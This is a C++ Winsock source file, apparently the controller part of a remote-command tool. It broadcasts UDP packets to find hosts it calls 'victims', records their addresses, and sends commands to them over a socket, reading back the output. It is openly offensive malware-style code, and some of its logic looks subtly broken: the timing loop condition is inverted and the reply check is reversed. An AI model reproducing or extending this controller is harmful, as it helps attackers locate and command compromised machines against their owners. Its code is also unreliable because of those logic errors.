#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Network.h"
#include <winsock2.h>
#include <Ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#include <time.h>


void searchVictims(uint32_t* address)
{
	SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s == INVALID_SOCKET)
	{std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl; return;}

	uint32_t victimsAddr;
	sockaddr_in addrinfo;
	sockaddr_in victiminfo;

	std::string message, response;
	int error;
	char* buf = new char[65536];
	int infoSize = sizeof victiminfo;

	/*these params are the params of the victims*/
	addrinfo.sin_addr.s_addr = inet_addr("255.255.255.255");
	addrinfo.sin_port = htons(667);
	addrinfo.sin_family = AF_INET;

	/*fixed messages for my "protocol"*/
	message = "What is your IP?";
	response = "My IP";

	int i = 0;
	time_t lapTime;
	time_t currentTime;
	while (1)
	{
		sendto(s, message.c_str(), message.size(), 0, (sockaddr*)&addrinfo, sizeof addrinfo);
		time(&lapTime);
		time(&currentTime);
		for (i;lapTime < currentTime-1800; i++)//every half an hour i send a new search packet
		{
			do
			{
				ZeroMemory(buf, 65536);
				if (!recvfrom(s, buf, 65536, 0, (sockaddr*)&victiminfo, &infoSize))
					break;
			} while (std::string(buf)._Equal(response)); //watiting to recv "My IP"
			address[i] = victiminfo.sin_addr.s_addr;
			time(&currentTime);
		}
	}
	delete[] buf;
}

std::string telNet(SOCKET sock, std::string& command)
{
	int n;
	char temp[4096] = { 0 };
	send(sock, command.c_str(), command.size(), 0);

	std::string output = "";
	do
	{
		n = recv(sock, temp, sizeof temp, 0);
		if (n == 0)
			return "";
		output += std::string(temp);
		memset(temp, 0, sizeof temp);
	} while (n >= 4096);
	return output;
}